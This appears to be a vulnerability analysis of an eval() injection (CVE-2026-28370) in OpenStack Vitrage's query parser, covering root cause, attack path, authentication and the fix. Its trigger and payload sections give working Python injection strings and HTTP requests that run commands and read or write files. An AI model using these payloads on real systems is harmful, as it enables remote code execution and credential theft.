# Vulnerability Analysis: CVE-2026-28370

## Executive Summary

CVE-2026-28370 is a critical (CVSS 9.1) Python `eval()` injection vulnerability in OpenStack Vitrage's graph query parser. An authenticated user can achieve arbitrary code execution on the Vitrage service host by injecting Python code through crafted query parameters sent to the REST API. The vulnerability exists because string values in user-supplied query dictionaries are interpolated into a Python expression string without escaping, which is then passed to `eval()`.

---

## Root Cause

**Type**: CWE-95 -- Eval Injection (Improper Neutralization of Directives in Dynamically Evaluated Code)

The function `create_predicate()` in `vitrage/graph/query.py` (lines 66-70) builds a Python lambda expression as a string from user-supplied query dictionaries and evaluates it using Python's built-in `eval()`.

The helper function `_evaluable_str()` (lines 103-108) is responsible for wrapping string values with single quotes before they are interpolated into the expression. However, it performs **no escaping of embedded single quotes** in the input:

```python
def _evaluable_str(value):
    """wrap string/unicode with back tick"""
    if isinstance(value, str):
        return '\'' + value + '\''   # <-- NO ESCAPING of embedded quotes
    else:
        return str(value)
```

This allows an attacker to break out of the string literal by including a single quote (`'`) in a query value or key, injecting arbitrary Python code into the expression that is subsequently evaluated by `eval()`.

**The vulnerable code flow:**

1. User sends a JSON query via REST API (e.g., `{"==": {"field": "MALICIOUS_VALUE"}}`)
2. API controller parses JSON: `query = json.loads(query_string)`
3. Query dict is passed via RPC to the graph service
4. `create_predicate(query_dict)` is called
5. `_create_query_expression(query)` recursively builds expression string
6. For leaf nodes, `_evaluable_str(key)` and `_evaluable_str(val)` wrap values in quotes
7. The final string `"lambda item: (item.get('field')== 'VALUE')"` is passed to `eval()`
8. If VALUE contains `'`, the attacker's code is executed

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable File

**File**: `vitrage/graph/query.py`

| Function | Lines | Role |
|---|---|---|
| `create_predicate(query_dict)` | 37-75 | Entry point; calls `_create_query_expression` then `eval()` on line 70 |
| `_create_query_expression(query, parent_operator)` | 78-100 | Recursively builds expression string from query dict |
| `_evaluable_str(value)` | 103-108 | Wraps values in quotes WITHOUT escaping -- the core flaw |
| `_join_logical_operator(op, expressions)` | 111-120 | Joins sub-expressions with and/or |

### Callers of `create_predicate()`

| File | Function | Line | Context |
|---|---|---|---|
| `vitrage/graph/driver/networkx_graph.py` | `get_vertices()` | ~line with `create_predicate(query_dict)` | Graph vertex queries |
| `vitrage/graph/driver/networkx_graph.py` | `get_vertices_ids()` | ~line with `create_predicate(query_dict)` | Graph vertex ID queries |
| `vitrage/graph/driver/networkx_graph.py` | `get_vertices_count()` | ~line with `create_predicate(query_dict)` | Graph vertex counting |
| `vitrage/graph/algo_driver/networkx_algorithm.py` | `graph_query_vertices()` | ~line with `create_predicate(query_dict)` | Graph algorithm queries |
| `vitrage/graph/algo_driver/networkx_algorithm.py` | `create_graph_from_matching_vertices()` | ~line with `create_predicate(query_dict)` | Graph creation from matches |

---

## Triggering Input

### Injection via Query VALUE

The attacker crafts a query dict where a string value contains a single-quote escape followed by Python code:

```json
{"==": {"x": "' + str(__import__('os').popen('id').read()) + '"}}
```

This generates the expression string:
```python
lambda item: (item.get('x')== '' + str(__import__('os').popen('id').read()) + '')
```

When `eval()` processes this, `__import__('os').popen('id').read()` executes as arbitrary Python code.

### Injection via Query KEY

Both keys and values in the innermost dict are passed through `_evaluable_str()`. The dict KEY is also vulnerable:

```json
{"==": {"' + str(__import__('os').popen('id').read()) + '": "anything"}}
```

Generates:
```python
lambda item: (item.get('' + str(__import__('os').popen('id').read()) + '')== 'anything')
```

### Execution Timing

The injected code executes when the lambda is **invoked** (not at `eval()` time). However, `create_predicate()` returns the lambda, and the calling code in `networkx_graph.py` immediately invokes it against graph vertices. So in practice, code execution occurs as part of the API request processing.

### Minimal Standalone Trigger (no OpenStack needed)

```python
# Direct invocation of the vulnerable function
from vitrage.graph.query import create_predicate

payload = {"==": {"x": "' + str(__import__('os').popen('id').read()) + '"}}
predicate = create_predicate(payload)
# At this point the lambda is created but code hasn't executed yet.
# The code executes when the predicate is called on a graph vertex.
# In a real deployment, this happens immediately.
```

### Full API Trigger (HTTP)

```
POST /v1/topology HTTP/1.1
Host: vitrage-host:8999
X-Auth-Token: <valid-keystone-token>
Content-Type: application/x-www-form-urlencoded

query={"==":{"x":"' + str(__import__('os').popen('id').read()) + '"}}&graph_type=tree&depth=1
```

Or via the resource list endpoint:
```
POST /v1/resources HTTP/1.1
Host: vitrage-host:8999
X-Auth-Token: <valid-keystone-token>
Content-Type: application/x-www-form-urlencoded

query={"==":{"x":"' + str(__import__('os').popen('id').read()) + '"}}
```

---

## Attack Scenario

### Step-by-step Exploitation

1. **Attacker obtains Keystone credentials** -- Any valid Vitrage API user account (the default policy allows ANY authenticated user, not just admins)
2. **Attacker crafts malicious query** -- A JSON query dict with an injected Python payload in a string value
3. **Attacker sends HTTP request** -- POST to `/v1/topology`, `/v1/resources`, or `/v1/resources/count` with the malicious `query` parameter
4. **API processes request** -- The Pecan controller calls `json.loads(query)` and passes the dict via RPC to the graph service
5. **Graph service evaluates query** -- `create_predicate()` builds the expression string and calls `eval()`
6. **Lambda is invoked** -- The graph service invokes the predicate on vertices, triggering the injected code
7. **Arbitrary code executes** -- As the Vitrage service user on the host system

### Attack Complexity: LOW

- No special timing, race conditions, or memory corruption required
- The injection is a simple string escape
- The payload is delivered in a single HTTP request

### Attacker Position

- **Remote, authenticated** -- Requires a valid Keystone token for the Vitrage service
- **Note on noauth mode**: If Vitrage is configured with `auth_mode = noauth` (the `vitrage+noauth` paste pipeline), NO authentication is required. The API is completely open. This is a development/test configuration but may exist in poorly-configured deployments.

---

## Impact

- **Arbitrary Code Execution (RCE)** -- Full command execution as the Vitrage service user
- **Confidentiality**: HIGH -- Can read any file accessible to the service user, access database credentials, Keystone tokens
- **Integrity**: HIGH -- Can modify the Vitrage database, entity graph, alter monitoring data
- **Availability**: HIGH -- Can crash the service, delete data, consume resources
- **Scope**: CHANGED -- The Vitrage service typically has access to other OpenStack service credentials (Keystone, Nova, Neutron) and can pivot to compromise the broader OpenStack deployment

---

## Authentication Requirements

### Keystone Authentication (default mode: `vitrage+keystone`)

1. Obtain a Keystone token: `POST /identity/v3/auth/tokens` with valid credentials
2. Include token in requests: `X-Auth-Token: <token>`
3. **No special roles required** -- The default policies for `get topology`, `list resources`, and `count resources` use `UNPROTECTED = ''` (empty check string), meaning ANY authenticated user passes the policy check

### No-Auth Mode (`vitrage+noauth`)

If configured with `auth_mode = noauth`, the API pipeline skips all authentication. No credentials needed -- any network-reachable client can exploit this.

### Policy Details

| Endpoint | Policy Rule | Default Check |
|---|---|---|
| POST /v1/topology | `get topology` | `UNPROTECTED` (empty = allow all) |
| POST /v1/resources | `list resources` | `UNPROTECTED` |
| GET /v1/resources | `list resources` | `UNPROTECTED` |
| POST /v1/resources/count | `count resources` | `UNPROTECTED` |

**For PoC purposes**: The standalone test can bypass all authentication by directly importing and calling `create_predicate()`. For a full API-level PoC, Keystone authentication or noauth mode is needed.

---

## Fix Assessment

### Fix Commit

`5b57e2b32a6d02992a28d9a671ebba5e308fd141` -- "Replace eval with function matching"

### What the Fix Does

The fix **completely eliminates** `eval()` and all string expression building:

1. **Removes**: `eval()`, `_evaluable_str()`, `_join_logical_operator()`, `_create_query_expression()`
2. **Adds**: `import operator` module and an `ops` dictionary mapping operator strings to `operator.*` functions
3. **Replaces**: String expression building with direct lambda/closure construction

The new `_create_query_function()` returns callable predicate functions directly:
- Comparison operators use `operator.lt`, `operator.eq`, etc. via the `ops` dict
- Logical operators use `all()`/`any()` over lists of predicate functions
- User-supplied values are captured as closure variables -- never interpolated into code strings

### Fix Completeness: COMPLETE

The fix is thorough and addresses the root cause:

1. **No `eval()`** -- The dangerous sink is completely removed
2. **No string interpolation** -- User values are never part of any expression string
3. **Type safety** -- Operator lookup uses a fixed dictionary; invalid operators raise `VitrageError`
4. **Value safety** -- User values are captured in closure variables (`f=field, v=value`), preventing any injection
5. **No bypass vectors identified** -- Since there is no string construction or `eval()`, there is no way to inject code regardless of input content (single quotes, double quotes, null bytes, unicode, etc.)

The fix properly addresses the root cause (using `eval()` on user input) rather than trying to sanitize input (which is brittle and bypass-prone).

### Potential Bypass Vectors: NONE IDENTIFIED

- No alternative encoding bypass possible -- `eval()` is gone entirely
- No secondary injection point -- all user values are captured as data, not code
- No TOCTOU or race condition -- the fix is a pure code-level change
- The `ast.literal_eval()` usages in `webhook.py` are for admin-configured webhook headers/filters (not user-controlled query parameters), and `ast.literal_eval` is safe by design

---

## Related Attack Surface

### Other `eval()` Usages in Codebase

The ONLY `eval()` call in the entire Vitrage codebase is in `vitrage/graph/query.py:70`. No other files use `eval()`.

### `ast.literal_eval()` Usages (SAFE)

| File | Context | Risk |
|---|---|---|
| `vitrage/notifier/plugins/webhook/webhook.py:129` | Parsing webhook headers from DB | Low -- admin-configured values |
| `vitrage/notifier/plugins/webhook/webhook.py:135` | Parsing webhook regex filters from DB | Low -- admin-configured values |
| `vitrage/api_handler/apis/webhook.py:135` | Validating webhook regex filter | Low -- `ast.literal_eval` is safe |
| `vitrage/api_handler/apis/webhook.py:147` | Validating webhook headers | Low -- `ast.literal_eval` is safe |

These use `ast.literal_eval()` which only evaluates Python literal expressions (strings, numbers, tuples, lists, dicts, booleans, None) and cannot execute arbitrary code. They are not exploitable.

### Same Vulnerability Pattern in Other Files: NONE IDENTIFIED

- The `_evaluable_str` and `_create_query_expression` functions only exist in `query.py`
- No other file builds expression strings from user input
- No `exec()` calls exist in the codebase
- No other templated code evaluation patterns found

---

## Payload Reference

### Benign PoC Payloads (for safe demonstration)

```python
# 1. Write marker file (proves write access)
{"==": {"x": "' + str(open('/tmp/pwned', 'w').write('CVE-2026-28370')) + '"}}

# 2. Read /etc/hostname (proves read access)
{"==": {"x": "' + open('/etc/hostname').read().strip() + '"}}

# 3. Execute id command (proves command execution)
{"==": {"x": "' + __import__('os').popen('id').read().strip() + '"}}
```

### Key-based Injection (alternative vector)

```python
# Inject through the dict KEY instead of VALUE
{"==": {"' + str(open('/tmp/pwned','w').write('KEY_INJECTION')) + '": "x"}}
```
